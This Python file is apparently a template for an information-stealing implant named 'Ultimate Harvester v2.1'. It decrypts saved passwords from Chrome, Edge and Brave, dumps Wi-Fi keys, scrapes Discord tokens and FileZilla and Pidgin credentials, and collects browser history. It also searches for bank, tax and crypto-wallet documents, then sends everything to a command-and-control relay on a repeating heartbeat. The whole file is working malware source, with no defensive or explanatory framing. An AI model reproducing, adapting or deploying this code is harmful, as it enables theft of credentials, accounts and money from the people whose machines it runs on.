# payload_template.py (Definitive, Ultimate Harvester v2.1)

import requests, time, socket, getpass, threading, subprocess, uuid, json, platform, psutil, os, xml.etree.ElementTree as ET, shutil, sqlite3, base64, re

# --- Safe Import for PyInstaller ---
try:
    import win32crypt
except ImportError:
    pass

# --- Configuration ---
RELAY_URL = "{{RELAY_URL}}"; C2_USER = "{{C2_USER}}"; SESSION_ID = str(uuid.uuid4())
results_to_send, results_lock = [], threading.Lock()

# --- HELPER FUNCTIONS ---
def find_browser_dbs(db_name_or_folder):
    """Finds all occurrences of a DB file or folder across multiple browsers and profiles."""
    db_paths = []
    # Base paths for common Chromium browsers
    base_paths = {
        "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data")
    }
    for browser, path in base_paths.items():
        if not os.path.exists(path): continue
        # Iterate through profiles like 'Default', 'Profile 1', etc.
        for profile in [d for d in os.listdir(path) if d.startswith('Profile ') or d == 'Default']:
            full_db_path = os.path.join(path, profile, db_name_or_folder)
            if os.path.exists(full_db_path):
                # Return the main browser path for key retrieval
                db_paths.append((browser, profile, full_db_path, path))
    return db_paths

def get_encryption_key(browser_path):
    """Retrieves the master AES key from the 'Local State' file."""
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    except Exception: return None

def decrypt_data(data, key):
    """Decrypts AES-256-GCM encrypted data from browsers."""
    try:
        iv = data[3:15]
        payload = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        # Fallback for older DPAPI method if AES fails
        try: return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8')
        except: return "Failed to decrypt"
        
def resilient_copy(src, dest):
    """Copies a file, returning True on success and False on failure (e.g., file lock)."""
    try:
        shutil.copy2(src, dest)
        return True
    except (IOError, PermissionError):
        return False

# --- FULL SUITE OF HARVESTING FUNCTIONS ---
def harvest_system_info():
    try:
        uname = platform.uname(); mem = psutil.virtual_memory()
        data = {
            "Hostname": socket.gethostname(), "CurrentUser": getpass.getuser(),
            "OS Version": f"{uname.system} {uname.release}", "OS Build": uname.version,
            "System Arch": uname.machine, "CPU": uname.processor,
            "CPU Cores": f"{psutil.cpu_count(logical=True)} (Logical)",
            "Total RAM": f"{mem.total / (1024**3):.2f} GB"
        }
        return {"status": "success", "data": data}
    except Exception as e: return {"status": "error", "data": str(e)}

def harvest_installed_apps():
    try:
        if platform.system() != "Windows": return {"status": "error", "data": "Windows Only"}
        import winreg; apps = []
        for hkey, flags in [(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY), (winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY), (winreg.HKEY_CURRENT_USER, 0)]:
            for path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"]:
                try:
                    key = winreg.OpenKey(hkey, path, 0, winreg.KEY_READ | flags)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        skey_name = winreg.EnumKey(key, i)
                        skey = winreg.OpenKey(key, skey_name)
                        try:
                            name = winreg.QueryValueEx(skey, 'DisplayName')[0]
                            version = winreg.QueryValueEx(skey, 'DisplayVersion')[0] if 'DisplayVersion' in [v[0] for v in winreg.EnumValue(skey, i)] else 'N/A'
                            publisher = winreg.QueryValueEx(skey, 'Publisher')[0] if 'Publisher' in [v[0] for v in winreg.EnumValue(skey, i)] else 'N/A'
                            if name and name not in [a['name'] for a in apps]:
                                apps.append({"name": name, "version": version, "publisher": publisher})
                        except: pass
                except: pass
        return {"status": "success", "data": sorted(apps, key=lambda x: x['name'])}
    except Exception as e: return {"status": "error", "data": str(e)}

def harvest_security_products():
    """IMPROVED: Cleans up the WMI output."""
    try:
        av = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName']).replace("displayName", "").strip()
        fw = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'FirewallProduct', 'get', 'displayName']).replace("displayName", "").strip()
        return {"status": "success", "data": {"Antivirus": av or "Not Found", "Firewall": fw or "Not Found"}}
    except Exception as e: return {"status": "error", "data": str(e)}

def harvest_network_info():
    try:
        interfaces, connections, public_ip = {}, [], "N/A"
        try: public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except: public_ip = "Failed to retrieve"
        for name, addrs in psutil.net_if_addrs().items():
            interfaces[name] = []
            for addr in addrs:
                family_str = "MAC" if addr.family == psutil.AF_LINK else ("IPv4" if addr.family == socket.AF_INET else "IPv6")
                interfaces[name].append({"family": family_str, "address": addr.address})
        for c in psutil.net_connections(kind='inet'):
            connections.append({"laddr": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "", "raddr": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "", "status": c.status})
        return {"status": "success", "data": {"Public IP": public_ip, "Interfaces": interfaces, "Connections": connections}}
    except Exception as e: return {"status": "error", "data": str(e)}

def harvest_wifi_passwords():
    """NEW: Re-integrated from previous project."""
    try:
        if platform.system() != "Windows": return {"status": "error", "data": "Windows Only"}
        profiles_data, profiles_result = [], subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True, errors='ignore')
        for name in [line.split(":")[1].strip() for line in profiles_result.stdout.split('\n') if "All User Profile" in line]:
            pass_result = subprocess.run(f'netsh wlan show profile name="{name}" key=clear', shell=True, capture_output=True, text=True, errors='ignore')
            password = next((line.split(":")[1].strip() for line in pass_result.stdout.split('\n') if "Key Content" in line), "N/A (Open Network)")
            profiles_data.append({"ssid": name, "password": password})
        return {"status": "success", "data": profiles_data}
    except Exception as e: return {"status": "error", "data": str(e)}

def harvest_browser_passwords():
    """IMPROVED: Handles file locks and finds master key correctly."""
    creds, locked_browsers = [], set()
    for browser, profile, db_path, browser_path in find_browser_dbs('Login Data'):
        key = get_encryption_key(browser_path)
        if not key: continue
        temp_path = os.path.join(os.environ["TEMP"], f"login_{uuid.uuid4()}")
        if not resilient_copy(db_path, temp_path):
            locked_browsers.add(f"{browser} ({profile})")
            continue
        try:
            conn = sqlite3.connect(temp_path)
            for row in conn.cursor().execute("SELECT origin_url, username_value, password_value FROM logins"):
                if all(row):
                    password = decrypt_data(row[2], key)
                    if password != "Failed to decrypt":
                        creds.append({"browser": browser, "profile": profile, "url": row[0], "username": row[1], "password": password})
            conn.close()
        except Exception: pass
        finally: os.remove(temp_path)
    
    data = creds
    if locked_browsers:
        data.append({"error": "DATABASE_LOCKED", "message": f"Could not access DBs for: {', '.join(locked_browsers)}. Is the browser open?"})
    return {"status": "success", "data": data}

def harvest_discord_tokens():
    """IMPROVED: Better regex and search logic."""
    tokens = set()
    regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}"
    for _, _, folder_path, _ in find_browser_dbs(os.path.join('Local Storage', 'leveldb')):
        if os.path.exists(folder_path):
            for file_name in os.listdir(folder_path):
                if not file_name.endswith(('.log', '.ldb')): continue
                try:
                    with open(os.path.join(folder_path, file_name), 'r', errors='ignore') as f:
                        for line in f:
                            for match in re.finditer(regex, line): tokens.add(match.group(0))
                except: pass
    return {"status": "success", "data": [{"token": t} for t in tokens]}

def harvest_browser_history():
    history = []
    for browser, profile, db_path, _ in find_browser_dbs('History'):
        temp_path = os.path.join(os.environ["TEMP"], f"history_{uuid.uuid4()}");
        if not resilient_copy(db_path, temp_path): continue
        try:
            conn = sqlite3.connect(temp_path)
            for row in conn.cursor().execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200"):
                history.append({"browser": browser, "profile": profile, "url": row[0], "title": row[1]})
            conn.close()
        except: pass
        finally: os.remove(temp_path)
    return {"status": "success", "data": history}

def harvest_app_credentials():
    """NEW: Re-integrated from previous project."""
    creds, roaming = [], os.getenv('APPDATA')
    targets = { "FileZilla": os.path.join(roaming, 'FileZilla', 'recentservers.xml'), "Pidgin": os.path.join(roaming, '.purple', 'accounts.xml') }
    if os.path.exists(targets["FileZilla"]):
        try:
            for server in ET.parse(targets["FileZilla"]).findall('.//Server'):
                creds.append({"app": "FileZilla", "host": f"{server.find('Host').text}:{server.find('Port').text}", "user": server.find('User').text, "pass": base64.b64decode(server.find('Pass').text).decode()})
        except: pass
    if os.path.exists(targets["Pidgin"]):
        try:
            for acc in ET.parse(targets["Pidgin"]).findall('.//account'):
                creds.append({"app": "Pidgin", "protocol": acc.find('protocol').text, "user": acc.find('name').text, "pass": acc.find('password').text})
        except: pass
    return {"status": "success", "data": creds}

def harvest_sensitive_docs():
    """IMPROVED: Better keywords and includes PDFs."""
    docs, keywords = [], ['invoice', 'receipt', 'tax', 'w2', 'bank', 'statement', 'loan', 'mortgage', 'crypto', 'seed', 'wallet', 'private', 'key', 'mnemonic', '2fa', 'backup', 'account', 'login']
    for root, dirs, files in os.walk(os.environ["USERPROFILE"]):
        # Prune search directories to avoid scanning junk
        dirs[:] = [d for d in dirs if not d.startswith('.') and 'appdata' not in d.lower()]
        if len(docs) > 100: break # Limit results to prevent massive payloads
        for file in files:
            if any(f in file.lower() for f in keywords) and file.lower().endswith(('.pdf', '.docx', '.xlsx', '.txt')):
                docs.append({"path": os.path.join(root, file)})
    return {"status": "success", "data": docs}

# --- Core Logic ---
def run_and_store(command, func):
    with results_lock:
        results_to_send.append({"command": command, "output": func()})

def great_harvest():
    # A more focused list based on user feedback
    tasks = {
        "System Info": harvest_system_info, "Installed Applications": harvest_installed_apps,
        "Security Products": harvest_security_products, "Network Info": harvest_network_info,
        "Wi-Fi Passwords": harvest_wifi_passwords, "Browser Passwords": harvest_browser_passwords,
        "App Credentials": harvest_app_credentials, "Discord Tokens": harvest_discord_tokens,
        "Sensitive Documents": harvest_sensitive_docs, "Browser History": harvest_browser_history,
    }
    for name, func in tasks.items():
        run_and_store(name, func)
        time.sleep(0.1)

def heartbeat_loop():
    while True:
        try:
            with results_lock:
                outgoing_results = results_to_send[:]
                results_to_send.clear()
            
            payload = {
                "session_id": SESSION_ID, "c2_user": C2_USER,
                "hostname": socket.gethostname(), "user": getpass.getuser(),
                "results": outgoing_results
            }
            requests.post(f"{RELAY_URL}/implant/hello", json=payload, timeout=15)
        except:
            # If the request fails, put the results back in the queue to try again later
            with results_lock:
                results_to_send.extend(outgoing_results)
        time.sleep(20)

if __name__ == "__main__":
    # Import AES here to avoid PyInstaller issues if Crypto isn't fully installed
    try: from Crypto.Cipher import AES
    except ImportError: pass

    threading.Thread(target=great_harvest, daemon=True).start()
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    while True: time.sleep(60)